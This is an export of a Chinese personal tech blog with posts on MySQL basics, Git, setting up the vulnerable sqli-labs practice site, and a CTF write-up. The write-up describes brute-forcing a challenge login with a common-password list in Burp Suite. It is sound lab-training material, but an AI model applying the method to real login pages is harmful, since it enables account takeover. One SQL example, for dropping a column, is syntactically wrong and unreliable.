<h1 id="MySQL的卸载"><a href="#MySQL的卸载" class="headerlink" title="MySQL的卸载"></a>MySQL的卸载</h1><p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112223649914.png" alt="image-20220112223649914"></p>
<p><img src="/2022/01/12/SQL%E5%85%A5%E9%97%A8/image-20220112223728875.png" alt="image-20220112223728875"></p>
<p>该图片摘自B站黑马程序员</p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL数据库基本操作</title>
    <url>/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="DDL语句"><a href="#DDL语句" class="headerlink" title="DDL语句"></a>DDL语句</h1><p>定义：数据库模式定义语言DDL(Data Definition Language)，是用于描述数据库中要存储的现实世界实体的语言。主要由create（添加）、alter（修改）、drop（删除）和 truncate（删除） 四个关键字完成。主要是对<strong>数据库</strong>的常规操作、对<strong>表结构</strong>的常规操作、修改表结构，而<strong>不涉及表中数据</strong>。</p>
<h2 id="对数据库的常规操作"><a href="#对数据库的常规操作" class="headerlink" title="对数据库的常规操作"></a>对数据库的常规操作</h2><table>
<thead>
<tr>
<th align="center">功能</th>
<th align="center">SQL</th>
</tr>
</thead>
<tbody><tr>
<td align="center">查看所有数据库</td>
<td align="center">show databases;</td>
</tr>
<tr>
<td align="center">创建数据库</td>
<td align="center">create database [if not exists] 数据库名 [charset=utf8];</td>
</tr>
<tr>
<td align="center">切换（选择要操作的）数据库</td>
<td align="center">use 数据库名;</td>
</tr>
<tr>
<td align="center">删除数据库</td>
<td align="center">drop database [if exists] 数据库名;</td>
</tr>
<tr>
<td align="center">修改数据库编码（了解）</td>
<td align="center">alter database 数据库名 character set utf8;</td>
</tr>
</tbody></table>
<p><strong>[ ]及其内的内容可以省去</strong></p>
<span id="more"></span>

<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220113211659756.png"></p>
<p>添加注释可以用<code>ctrl键+/键</code>也可以在前面加一个#</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220113211843753.png" alt="image-20220113211843753"></p>
<p>创建数据库</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220113212741828.png" alt="image-20220113212741828"></p>
<p>删除数据库（if exists就是防止报错）</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220113213139430.png" alt="image-20220113213139430"></p>
<p>SQLyog同上</p>
<h2 id="对表结构的常规操作"><a href="#对表结构的常规操作" class="headerlink" title="对表结构的常规操作"></a>对表结构的常规操作</h2><p>创建表格式</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220113213736111.png" alt="image-20220113213736111"></p>
<p>创建表实际上就是构建一张空表，指定这个表的名字，这个表有几列，每一列叫什么名字，以及每一列存储的数据类型。例如</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220114222351075.png" alt="image-20220114222351075"></p>
<p>创建完成</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220114222510231.png" alt="image-20220114222510231"></p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>范围</th>
<th>范围（无符号）</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>TINYINT</td>
<td>1 byte</td>
<td>(-2^7,2^7 -1)</td>
<td>(0,2^8 -1)</td>
<td>小整数值</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2 bytes</td>
<td>(-2^15 ,2^15 -1)</td>
<td>(0,2^16 -1)</td>
<td>大整数值</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3 bytes</td>
<td>(-2^23,2^23 -1)</td>
<td>(0,2^24 -1)</td>
<td>大整数值</td>
</tr>
<tr>
<td>INT或INTEGER</td>
<td>4 bytes</td>
<td>(-2^31,2^31 -1)</td>
<td>(0,2^32 -1)</td>
<td>大整数值</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8 bytes</td>
<td>(-2^63,2^63 -1)</td>
<td>(0,2^64 -1)</td>
<td>极大整数值</td>
</tr>
<tr>
<td>FLOAT</td>
<td>4 bytes</td>
<td>很大，已够用</td>
<td>此处不再举例</td>
<td>单精度浮点数值</td>
</tr>
<tr>
<td>DOUBLE</td>
<td>8 bytes</td>
<td>超级大</td>
<td>此处不再举例</td>
<td>双精度浮点数值</td>
</tr>
<tr>
<td>DECIMAL</td>
<td></td>
<td>依赖于M，D的取值</td>
<td>依赖于M，D的取值</td>
<td>小数值</td>
</tr>
</tbody></table>
<p><strong>注意无符号数的使用，例如<code>int unsigned</code></strong></p>
<p><strong>decimal的使用：<code>decimal(M,D)</code> M表示有效数字个数，D表示小数点后数字个数</strong></p>
<h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table>
<thead>
<tr>
<th>类型</th>
<th>大小</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>CHAR</td>
<td>0-2^8 -1 bytes</td>
<td>定长字符串</td>
</tr>
<tr>
<td>VARCHAR</td>
<td>0-2^16 -1 bytes</td>
<td>变长字符串</td>
</tr>
<tr>
<td>TINYBLOB</td>
<td>0-2^8 -1 bytes</td>
<td>不超过255个字符的二进制字符串</td>
</tr>
<tr>
<td>TINYTEXT</td>
<td>0-2^8 -1 bytes</td>
<td>短文本字符串</td>
</tr>
<tr>
<td>BLOB</td>
<td>0-2^16 -1 bytes</td>
<td>二进制形式的长文本数据</td>
</tr>
<tr>
<td>TEXT</td>
<td>0-2^16 -1 bytes</td>
<td>长文本数据</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>0-2^24 -1 bytes</td>
<td>二进制形式的中等长度文本数据</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>0-2^24 -1 bytes</td>
<td>中等长度文本数据</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>0-2^32 -1 bytes</td>
<td>二进制形式的极大文本数据</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>0-2^32 -1 bytes</td>
<td>极大文本数据</td>
</tr>
</tbody></table>
<h4 id="日期类型"><a href="#日期类型" class="headerlink" title="日期类型"></a>日期类型</h4><table>
<thead>
<tr>
<th>类型</th>
<th>大小（bytes）</th>
<th>范围</th>
<th>格式</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>DATE</td>
<td>3</td>
<td>1000-01-01/9999-12-31</td>
<td>YYYY-MM-DD</td>
<td>日期值</td>
</tr>
<tr>
<td>TIME</td>
<td>3</td>
<td>-838:59:59/838:59:59</td>
<td>HH:MM:SS</td>
<td>时间值或持续时间</td>
</tr>
<tr>
<td>YEAR</td>
<td>1</td>
<td>1901/2155</td>
<td>YYYY</td>
<td>年份值</td>
</tr>
<tr>
<td>DATETIME</td>
<td>8</td>
<td>1000-01-01 00:00:00/9999-12-31 23:59:59</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>混合日期和时间值</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>4</td>
<td>自动填充当前时区的时间</td>
<td>YYYY-MM-DD HH:MM:SS</td>
<td>混合日期和时间，时间戳</td>
</tr>
</tbody></table>
<h2 id="对表结构的其他操作"><a href="#对表结构的其他操作" class="headerlink" title="对表结构的其他操作"></a>对表结构的其他操作</h2><table>
<thead>
<tr>
<th>功能</th>
<th>SQL</th>
</tr>
</thead>
<tbody><tr>
<td>查看当前数据库的所有表名称</td>
<td>show tables;</td>
</tr>
<tr>
<td>查看指定某个表的创建语句</td>
<td>show create table 表名;</td>
</tr>
<tr>
<td>查看表结构</td>
<td>desc 表名;</td>
</tr>
<tr>
<td>删除表</td>
<td>drop table 表名;</td>
</tr>
</tbody></table>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115161216424.png" alt="image-20220115161216424"></p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115161249649.png" alt="image-20220115161249649"></p>
<h2 id="修改表结构"><a href="#修改表结构" class="headerlink" title="修改表结构"></a>修改表结构</h2><h3 id="添加列"><a href="#添加列" class="headerlink" title="添加列"></a>添加列</h3><p>语法：<code>alter table 表名 add 列名 类型（长度） [约束];</code></p>
<p>例如，为students表添加一个新的字段为：班级class， 类型为varchar(20)</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115162239940.png" alt="image-20220115162239940"></p>
<h3 id="修改列名和类型"><a href="#修改列名和类型" class="headerlink" title="修改列名和类型"></a>修改列名和类型</h3><p>语法：<code>alter table 表名 change 旧列名 新列名 类型(长度) [约束]</code></p>
<p>例如，为students表的class字段更换为department varchar(30)</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115162949440.png" alt="image-20220115162949440"></p>
<h3 id="删除列"><a href="#删除列" class="headerlink" title="删除列"></a>删除列</h3><p>语法：<code>alter table students 列名;</code></p>
<p>例如，删除students里的department列</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115163321176.png" alt="image-20220115163321176"></p>
<h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><p>语法：<code>rename table 旧表名 to 新表名;</code></p>
<p>例如，将students修改为student</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115163753768.png" alt="image-20220115163753768"></p>
<h1 id="DML语句"><a href="#DML语句" class="headerlink" title="DML语句"></a>DML语句</h1><p>DML是指数据操作语言，英文全称是Data Manipulation Language，用来对数据库中的<strong>表的数据</strong>记录进行更新。</p>
<p>关键字：插入（insert）、删除（delete）、更新（update）</p>
<h2 id="数据插入"><a href="#数据插入" class="headerlink" title="数据插入"></a>数据插入</h2><p>语法</p>
<p>向表中插入（某些列）：<code>insert into 表(列名1,列名2,列名3...) values (值1,值2,值3...),(值1,值2,值3...),...;</code></p>
<p>向表中插入（所有列）：<code>insert into 表 values(值1,值2,值3...),(值1,值2,值3...),...;</code></p>
<p><strong>注意：varchar的值要用单引号括起来</strong></p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115170701105.png" alt="image-20220115170701105"></p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115172902200.png" alt="image-20220115172902200"></p>
<p>这里的日期也可以写成  ‘2001-05-20’  注意要有单引号</p>
<h2 id="数据修改"><a href="#数据修改" class="headerlink" title="数据修改"></a>数据修改</h2><p>语法：</p>
<p>修改所有行：<code>update 表名 set 字段名=值,字段名=值,...;</code></p>
<p>修改特定行：<code>update 表名 set 字段名=值,字段名=值,... where 条件;</code></p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115173828946.png" alt="image-20220115173828946"></p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115174031967.png" alt="image-20220115174031967"></p>
<p>where可以很复杂，也可以是范围，例如<code>where sid &gt; 2</code></p>
<h2 id="数据删除"><a href="#数据删除" class="headerlink" title="数据删除"></a>数据删除</h2><p>语法：</p>
<p>删除行（如果没有where限定，则删除所有行）：<code>delete from 表名 [where 条件];</code></p>
<p><code>truncate table 表名</code> 或者 <code>truncate 表名</code></p>
<p>区别：delete和truncate原理不同，delete只删除内容，而truncate类似于drop table，可以理解为将整个表删除后，再创建该表。</p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115175332867.png" alt="image-20220115175332867"></p>
<p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115175411829.png" alt="image-20220115175411829"></p>
<p>删除所有行的delete和truncate效果一样</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="/2022/01/13/SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image-20220115175602576.png" alt="image-20220115175602576"></p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Win7搭建sqlilabs</title>
    <url>/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/</url>
    <content><![CDATA[<h1 id="下载sqli-labs"><a href="#下载sqli-labs" class="headerlink" title="下载sqli-labs"></a>下载sqli-labs</h1><p><a href="https://github.com/Audi-1/sqli-labs">点击此处下载</a>sqli-labs</p>
<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102456244.png" alt="image-20220112102456244"></p>
<p>下载后将该文件移入虚拟机，并解压到如下文件夹</p>
<span id="more"></span>

<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102537646.png" alt="image-20220112102537646"></p>
<h1 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h1><p>进入如下位置</p>
<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102702411.png" alt="image-20220112102702411"></p>
<p>打开phpstudy并启用如下服务</p>
<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102759449.png" alt="image-20220112102759449"></p>
<p>然后访问sqli-labs的网址</p>
<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112102840119.png" alt="image-20220112102840119"></p>
<p>安装完成后即可使用</p>
<h1 id="物理机访问虚拟机的sqli-labs"><a href="#物理机访问虚拟机的sqli-labs" class="headerlink" title="物理机访问虚拟机的sqli-labs"></a>物理机访问虚拟机的sqli-labs</h1><p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112103120644.png" alt="image-20220112103120644"></p>
<p>然后用物理机访问IPv4地址中的sqli-labs文件夹</p>
<p><img src="/2022/01/12/Win7%E6%90%AD%E5%BB%BAsqlilabs/image-20220112103219553.png" alt="image-20220112103219553"></p>
<p>完成</p>
<p><strong>最后提示：一定一定一定一定要打开phpstudy的相关服务</strong></p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku-bp</title>
    <url>/2021/12/05/bugku-bp/</url>
    <content><![CDATA[<p>根据题目提示，要用top1000密码</p>
<p><img src="/2021/12/05/bugku-bp/image-20211205185551656.png" alt="image-20211205185551656"></p>
<p>爆破结果如下</p>
<span id="more"></span>

<p><img src="/2021/12/05/bugku-bp/image-20211205185641750.png" alt="image-20211205185641750"></p>
<p>结果均为908，则猜想正确结果与错误结果的length一样，则选择其他参考标准，通过观察响应包里面的内容，我们发现错误包里面都会返回一个JavaScript代码告知我们的密码有错误。因此我们通过Burpsuite的 （Grep – Match 在响应中找出存在指定的内容的一项。）过滤掉存在JavaScript代码中的{code: ‘bugku10000’}的数据包。</p>
<p>添加如图内容，继续爆破</p>
<p><img src="/2021/12/05/bugku-bp/image-20211205185817178.png" alt="image-20211205185817178"></p>
<p>发现可疑点</p>
<p><img src="/2021/12/05/bugku-bp/image-20211205185906383.png" alt="image-20211205185906383"></p>
<p>输入该密码，得到flag。</p>
]]></content>
      <tags>
        <tag>bp</tag>
      </tags>
  </entry>
  <entry>
    <title>Git的介绍、安装和基本提交</title>
    <url>/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/</url>
    <content><![CDATA[<h1 id="Git的优势"><a href="#Git的优势" class="headerlink" title="Git的优势"></a>Git的优势</h1><ul>
<li><p>大部分操作在本地完成，不需要连接互联网</p>
</li>
<li><p>完整性保证（利用Hash值）</p>
</li>
<li><p>尽可能添加数据而不是删除数据或修改数据，从而避免了不可逆操作（为每个版本拍摄快照）</p>
</li>
<li><p>分支操作非常快捷流畅</p>
</li>
<li><p>与Linux命令全面兼容（二者是一个爹）</p>
<span id="more"></span></li>
</ul>
<h1 id="Git的安装"><a href="#Git的安装" class="headerlink" title="Git的安装"></a>Git的安装</h1><p>首先去<a href="https://git-scm.com/download/win">git官网下载</a>并根据自己电脑的位数选择相应的版本</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108191953930.png" alt="image-20220108191953930"></p>
<p>下载完成后安装，选择一个非中文没有空格的目录</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192101316.png" alt="image-20220108192101316"></p>
<p>然后下一步，按照下面图片的选项即可</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192700075.png" alt="image-20220108192700075"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192807726.png" alt="image-20220108192807726"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108192853679.png" alt="image-20220108192853679"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193229371.png" alt="image-20220108193229371"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193435463.png" alt="image-20220108193435463"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193801302.png" alt="image-20220108193801302"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193945547.png" alt="image-20220108193945547"></p>
<p>然后安装即可，装完效果如下</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194259961.png" alt="image-20220108194259961"></p>
<h1 id="Git在本地的结构"><a href="#Git在本地的结构" class="headerlink" title="Git在本地的结构"></a>Git在本地的结构</h1><p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108194609170.png" alt="image-20220108194609170"></p>
<h1 id="Git和代码托管中心"><a href="#Git和代码托管中心" class="headerlink" title="Git和代码托管中心"></a>Git和代码托管中心</h1><p>代码托管中心有很多，如外网环境下的GitHub、码云，局域网里的GitLab服务器（Git和Github的历史发展没有渊源）代码托管中心的任务是维护远程库</p>
<h1 id="Git的本地库和远程库的交互"><a href="#Git的本地库和远程库的交互" class="headerlink" title="Git的本地库和远程库的交互"></a>Git的本地库和远程库的交互</h1><p>团队内协作（不加入团队不可push修改远程库代码）</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108202115421.png" alt="image-20220108202115421"></p>
<p>跨团队协作</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108211729222.png" alt="image-20220108211729222"></p>
<h1 id="Git命令行操作"><a href="#Git命令行操作" class="headerlink" title="Git命令行操作"></a>Git命令行操作</h1><h2 id="本地库操作"><a href="#本地库操作" class="headerlink" title="本地库操作"></a>本地库操作</h2><h3 id="本地库初始化"><a href="#本地库初始化" class="headerlink" title="本地库初始化"></a>本地库初始化</h3><p>命令：<code>git init</code></p>
<p>效果：<img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108212311272.png" alt="image-20220108212311272"></p>
<p>注意：.git目录中存放的是本地库相关的子目录和文件，不要删除和修改</p>
<h3 id="设置签名"><a href="#设置签名" class="headerlink" title="设置签名"></a>设置签名</h3><p>形式：</p>
<p>用户名：随便输</p>
<p>Email地址：随便输，不存在也没关系</p>
<p>作用：区分不同开发人员</p>
<p>辨析：这里设置的签名和远程库（代码托管中心）的账号和密码一点关系没有</p>
<p>命令：<code>git config user.name 用户名</code>  </p>
<p>​        ：<code>git config user.email 邮件地址</code>    项目级别</p>
<p>​        ：<code>git config --global user.name 用户名</code></p>
<p>​         :  <code>git config --global user.email 邮件地址</code>    系统用户级别</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108214655319.png" alt="image-20220108214655319"></p>
<p>项目级别/仓库级别：仅在当前本地库范围内有效（即只在test文件夹内有效）</p>
<p>系统用户级别：登录当前操作系统的用户范围，如图</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108213618080.png" alt="image-20220108213618080"></p>
<p>若没设置，则默认是系统用户级别，若两个都有，则是项目级别。也就是项目级别优先于系统用户级别。</p>
<p>若二者都没有是不允许的</p>
<p>项目级别用户名和邮件地址保存在.git/config里面，如上图</p>
<p>系统用户级别用户名和邮件地址保存在当前用户文件夹里，如图</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108215432512.png" alt="image-20220108215432512"></p>
<p>通常只设置一个系统用户级别</p>
<h3 id="添加提交和查看状态操作"><a href="#添加提交和查看状态操作" class="headerlink" title="添加提交和查看状态操作"></a>添加提交和查看状态操作</h3><p>查看当前库状态命令：<code>git status</code></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220013324.png" alt="image-20220108220013324"></p>
<p>创建文件命令：<code>vim 文件名.文件类型</code>（创建后即使未提交，在windows文件夹中也可看到该文件）</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220229743.png" alt="image-20220108220229743"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220240175.png" alt="image-20220108220240175"></p>
<p>按I键开始输入内容</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108220517621.png" alt="image-20220108220517621"></p>
<p>编辑完成后按ESC然后输入<code>:wq</code>退出</p>
<p>此时再输入<code>git status</code>可看到</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
<p>将工作区文件放入暂存区命令：<code>git add 文件名.文件类型</code></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221653353.png" alt="image-20220108221653353"></p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108193655903.png" alt="image-20220108193655903"></p>
<p>放进去后，在用<code>git status</code>看一下状态，可知test.txt已经进入暂存区</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222245958.png" alt="image-20220108222245958"></p>
<p>若使用<code>git rm --cached test.txt</code>则又回到此状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108221241830.png" alt="image-20220108221241830"></p>
<p>将暂存区文件提交到本地库命令：<code>git commit 文件名.文件类型</code></p>
<p>vim编辑器中输入<code>:set nu</code>来查看行号</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108222950393.png" alt="image-20220108222950393"></p>
<p>然后按I键来进行输入更改备注信息</p>
<p>输入好后按ESC然后输入<code>:wq</code>退出</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223450538.png" alt="image-20220108223450538"></p>
<p>然后再看一下状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108223535612.png" alt="image-20220108223535612"></p>
<p>利用<code>git commit --amend - “新的备注”</code>来更改备注信息，并用<code>git log</code>来查看历史版本</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224049105.png" alt="image-20220108224049105"></p>
<p>用<code>vim test.txt</code>继续编辑文件，加入一行“d”然后再查看状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108224800559.png" alt="image-20220108224800559"></p>
<p>这里用<code>git add test.txt</code>按部就班的进行提交，然后查看状态</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225112194.png" alt="image-20220108225112194"></p>
<p>然后进行提交，这里用<code>git commit -m &quot;备注&quot; test.txt</code>进行提交，不用再在vim编辑器里输入备注信息</p>
<p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225410302.png" alt="image-20220108225410302"></p>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>关于读书</title>
    <url>/2021/11/23/hello-world/</url>
    <content><![CDATA[<p>这是我的第一条博客!在这里我会更新自己觉得有价值的东西，希望这对你能有一些帮助。<br>嗯… 也不知道到写些什么，那就摘一篇我认为很有价值的文章吧！</p>
<h2 id="关于读书（引自罗翔老师）"><a href="#关于读书（引自罗翔老师）" class="headerlink" title="关于读书（引自罗翔老师）"></a>关于读书（引自罗翔老师）</h2><h3 id="一-为什么读书？"><a href="#一-为什么读书？" class="headerlink" title="一.为什么读书？"></a>一.为什么读书？</h3><p>我们为什么要读书？</p>
<span id="more"></span>

<p>你会毫不犹豫的说，因为读书能够获得知识。</p>
<p>那人又为什么要获得知识呢？</p>
<p>我想答案不外乎是，因为知识可以改变人的命运、知识可以让你将来找到一个好工作，知识能够让你摆脱愚昧等等。</p>
<p>宋朝皇帝真宗赵恒说的比大家更为直白：</p>
<p>富家不用买良田，书中自有千锺粟</p>
<p>安居不用架高堂，书中自有黄金屋</p>
<p>出门莫恨无人随，书中车马多如簇</p>
<p>娶妻莫恨无良媒，书中自有颜如玉</p>
<p>男儿若遂平生志，六经勤向窗前读</p>
<p>你看，读书的好处真不少，车子、票子、房子、妻子都有了。</p>
